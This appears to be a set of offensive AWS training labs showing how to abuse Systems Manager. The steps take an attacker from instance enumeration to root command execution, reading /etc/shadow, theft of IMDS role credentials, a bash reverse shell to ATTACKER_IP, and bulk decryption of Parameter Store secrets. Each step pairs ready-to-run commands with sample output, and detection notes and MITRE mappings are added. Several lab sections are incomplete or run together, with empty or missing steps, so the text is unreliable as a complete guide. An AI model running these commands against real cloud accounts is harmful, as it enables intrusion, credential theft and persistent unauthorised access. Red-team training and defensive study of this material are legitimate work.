Objective: Enumerate all Systems Manager-managed EC2 instances, correlate with EC2 metadata, and identify high-value targets for remote command execution.
Prerequisites:
  • AWS credentials with ssm:DescribeInstanceInformation and ec2:DescribeInstances permissions — the stolen profile from M06-L01 works if the EC2 role has SSM read access
  • AWS CLI v2 installed and configured (aws --version must show 2.x)
  • jq installed on the attacker machine for JSON parsing
  • No prior M08 lab dependency — this is the entry point for the M08 chain
  • Lab environment pre-deployed with multiple EC2 instances running the SSM agent with varying platform types (Linux and Windows)

Objective: Achieve remote code execution on EC2 instances via SSM SendCommand, extract sensitive data, steal IMDS credentials, and establish a reverse shell.
Prerequisites:
  • Completion of M08-L01 — you must have identified Online SSM-managed instances and their instance IDs
  • AWS credentials with ssm:SendCommand and ssm:GetCommandInvocation permissions
  • AWS CLI v2 on the attacker machine
  • For the reverse shell step: a publicly reachable listener IP (ATTACKER_IP) with port 4444 open and nc (netcat) installed
  • Target instance must be running Linux for the bash reverse shell; adjust to PowerShell syntax for Windows targets
1
Send a shell command to the target instance via SSM. The command runs as root (Linux) or SYSTEM (Windows) by default. Critical: send-command is asynchronous — it returns a CommandId immediately but the command has not yet executed. You must capture the ID and poll for results separately.
Terminal
$ CMD_ID=$(aws ssm send-command \ --instance-ids "i-0abc123" \ --document-name "AWS-RunShellScript" \ --parameters 'commands=["id","whoami","hostname","cat /etc/os-release"]' \ --query 'Command.CommandId' --output text) $ echo "Command ID: $CMD_ID"
Command ID: cmd-0a1b2c3d4e5f67890
2
Poll for the command result using the captured CommandId. Wait a few seconds before the first poll — the SSM agent must receive the command, execute it, and post results. Check both Status and StandardOutputContent together. The results confirm root-level execution on the target.
Terminal
$ sleep 5
$ aws ssm get-command-invocation \ --command-id "$CMD_ID" \ --instance-id "i-0abc123" \ --query '[Status,StandardOutputContent]'
[ "Success", "uid=0(root) gid=0(root) groups=0(root)\nroot\nprod-web-01\nNAME=\"Amazon Linux\"\nVERSION=\"2\"\nID=\"amzn\"\nID_LIKE=\"centos rhel fedora\"\nVERSION_ID=\"2\"\nPRETTY_NAME=\"Amazon Linux 2\"\n" ]
3
Read sensitive system files. With root access via SSM, password hashes and other protected files are directly accessible. Note that each send-command call is async — always capture the new CMD_ID and poll for results.
Terminal
$ CMD_ID=$(aws ssm send-command \ --instance-ids "i-0abc123" \ --document-name "AWS-RunShellScript" \ --parameters 'commands=["cat /etc/shadow"]' \ --query 'Command.CommandId' --output text)
$ sleep 5 && aws ssm get-command-invocation \ --command-id "$CMD_ID" \ --instance-id "i-0abc123" \ --query 'StandardOutputContent' --output text
root:$6$rounds=4096$sAlT$hashEXAMPLE...:19370:0:99999:7::: bin:*:18353:0:99999:7::: daemon:*:18353:0:99999:7::: ec2-user:$6$rounds=4096$xYz$anotherHashEXAMPLE...:19370:0:99999:7::: webapp:$6$rounds=4096$AbC$webappHashEXAMPLE...:19375:0:99999:7:::
4
Steal IMDS credentials from the target instance via SSM command execution. This provides the instance's IAM role credentials for further AWS API access. The inline shell command performs the two-step IMDS role-name discovery and credential fetch in a single command string.
Terminal
$ CMD_ID=$(aws ssm send-command \ --instance-ids "i-0abc123" \ --document-name "AWS-RunShellScript" \ --parameters 'commands=["ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"]' \ --query 'Command.CommandId' --output text)

5
Establish a reverse shell for interactive access. Start the listener on your attacker machine first, then send the reverse shell command via SSM. This gives a persistent foothold beyond the SSM command-response pattern. The SSM agent executes the bash reverse shell as root, connecting back to your listener.
Terminal
# Start listener on attacker machine (separate terminal):
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
# Send reverse shell via SSM (replace ATTACKER_IP with your IP):
$ CMD_ID=$(aws ssm send-command \ --instance-ids "i-0abc123" \ --document-name "AWS-RunShellScript" \ --parameters 'commands=["bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''"]' \ --query 'Command.CommandId' --output text)
# Listener receives connection: Connection received on 10.0.1.50 48234 root@prod-web-01:/# id uid=0(root) gid=0(root) groups=0(root) root@prod-web-01:/# hostname prod-web-01

Detection Note: ssm:SendCommand IS logged to CloudTrail. Look for SendCommand events where the caller is not a recognized automation identity, or where the document is AWS-RunShellScript targeting production instances. Commands execute as root/SYSTEM by default — no privilege escalation needed. SSM bypasses security groups entirely — no inbound ports required. MITRE ATT&CK: T1651 — Cloud Administration Command.
Cleanup:
  • Terminate any active reverse shell sessions: type exit in the shell or kill the netcat listener with Ctrl+C
  • SSM command execution is ephemeral — no persistent processes are left unless you explicitly installed something
  • Remove any credential profiles configured from the stolen IMDS credentials
  • If the reverse shell spawned a child process on the target instance, kill it via another send-command: commands=["pkill -f 'bash -i'"]
Objective: Use SSM Session Manager to establish an interactive shell on target instances, enumerate the system, pivot using the instance's IAM role, and leverage port-forwarding to reach internal services.
Prerequisites:
  • Completion of M08-L01 — you must have identified Online SSM-managed instance IDs
  • AWS credentials with ssm:StartSession and ssm:TerminateSession permissions
  • AWS CLI v2 on the attacker machine
  • Session Manager plugin installed separately from the AWS CLI — the plugin is not included in the AWS CLI package and must be installed independently (see step 1)
  • For port-forwarding: knowledge of internal service ports on target instances (e.g., 3306 for MySQL, 5432 for PostgreSQL)
1
Install the Session Manager plugin for the AWS CLI. This plugin is a hard requirement — aws ssm start-session will fail with an error if the plugin is not installed. It must be installed separately from the AWS CLI itself.

$ unzip sessionmanager-bundle.zip

2

Detection Note: Session Manager traffic is encrypted and goes through AWS service endpoints — invisible to VPC Flow Logs and traditional network monitoring. The only detection surface is CloudTrail (ssm:StartSession API call) and SSM Session Manager audit logs if enabled. ssm:StartPortForwardingSession is also logged. Objective: Enumerate SSM Parameter Store to discover and extract stored secrets, database credentials, API keys, and connection strings.
Prerequisites:
  • AWS credentials with ssm:DescribeParameters, ssm:GetParameter, and ssm:GetParametersByPath permissions — the WebServerRole stolen via Session Manager in L03 typically has these permissions to access application secrets
  • AWS CLI v2 on the attacker machine
  • For SecureString decryption: the identity must also have kms:Decrypt on the KMS key used to encrypt the parameter; if the key uses the default AWS-managed SSM key, this is often automatically granted to IAM roles in the same account
  • jq and psql (or mysql) installed for credential validation
1
List all parameters in the Parameter Store to discover the naming hierarchy and identify potential secrets by their names and descriptions. Parameter names often reveal their purpose — look for paths containing password, secret, key, or token.
Terminal
$ aws ssm describe-parameters \ --query 'Parameters[*].[Name,Type,Description]' --output table

2
Retrieve all parameters recursively with decryption enabled. The --with-decryption flag decrypts SecureString parameters if you have the required KMS permissions. The --recursive flag traverses all path prefixes. This single command dumps the entire Parameter Store including all secrets.

4
Retrieve individual SecureString parameters with --with-decryption. This flag is required for SecureString type parameters — omitting it returns a ciphertext blob instead of the plaintext value. Assemble full database connection strings from the individual parameters for direct database access.
Terminal
$ aws ssm get-parameter --name /prod/db/password \ --with-decryption --query 'Parameter.Value' --output text
Pr0dP@ssw0rd!2024
$ DB_HOST=$(aws ssm get-parameter --name /prod/db/host --query 'Parameter.Value' --output text)
$ DB_USER=$(aws ssm get-parameter --name /prod/db/username --query 'Parameter.Value' --output text)
$ DB_PASS=$(aws ssm get-parameter --name /prod/db/password --with-decryption --query 'Parameter.Value' --output text)
$ echo "postgresql://${DB_USER}:${DB_PASS}@${DB_HOST}:5432/maindb"
postgresql://admin:Pr0dP@ssw0rd!2024@prod-db.cxyz123abc.us-east-1.rds.amazonaws.com:5432/maindb

Detection Note: ssm:DescribeParameters and ssm:GetParametersByPath are logged to CloudTrail. Bulk retrieval of all parameters (especially with --with-decryption) by any identity other than the expected application service role is a high-confidence finding. SSM Parameter Store is one of the most common places to find plaintext or easily decryptable credentials in AWS environments. Without proper KMS key policies and IAM restrictions, any user with ssm:GetParameter access can read everything. MITRE ATT&CK: T1552.001 — Unsecured Credentials: Credentials In Files.
